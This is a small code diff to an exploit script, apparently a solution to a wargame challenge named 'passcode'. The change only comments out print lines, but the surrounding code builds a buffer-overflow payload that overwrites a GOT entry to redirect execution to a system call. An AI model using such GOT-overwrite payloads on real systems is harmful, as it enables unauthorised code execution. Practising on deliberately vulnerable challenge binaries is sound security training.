@@ -14,7 +14,7 @@ system_addr = str.encode(str(0x80485e3))
 
 # payload
 payload = b'a'*96 + fflush_got + system_addr
-print("payload = ", payload)
+#print("payload = ", payload)
 
 # Pwn
 passcode.sendline(payload)
@@ -33,7 +33,7 @@ system_addr = str.encode(str(0x80485e3))
 
 # payload
 payload = b'a'*96 + printf_got + system_addr
-print("payload = ", payload)
+#print("payload = ", payload)
 
 # Pwn
 passcode.sendline(payload)
